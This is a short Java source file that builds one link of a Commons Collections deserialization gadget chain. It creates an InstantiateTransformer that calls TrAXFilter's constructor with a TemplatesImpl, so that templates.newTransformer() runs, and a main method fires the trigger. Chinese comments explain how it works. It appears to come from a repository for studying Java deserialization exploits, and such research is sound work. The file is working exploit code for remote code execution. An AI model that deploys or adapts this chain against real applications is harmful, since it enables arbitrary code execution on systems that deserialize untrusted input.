package transformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import templates.TemplatesGenerator;

import javax.xml.transform.Templates;

public class Instantiate {
    /*
    触发条件：InstantiateTransformer.transform(TrAXFilter.class)
    原理是InstantiateTransformer.transform可以调用任意构造器
    TrAXFilter的构造器TrAXFilter(Templates templates)会调用templates.newTransformer()
     */
    public static InstantiateTransformer getInstantiateTransformer() throws Exception {
        return new InstantiateTransformer(
                new Class[]{Templates.class}, new Object[]{
                        //这里填templatesImpl
                        TemplatesGenerator.getTemplatesImpl()
                }
        );
    }

    public static void main(String[] args) throws Exception {
        getInstantiateTransformer().transform(TrAXFilter.class);
    }
}
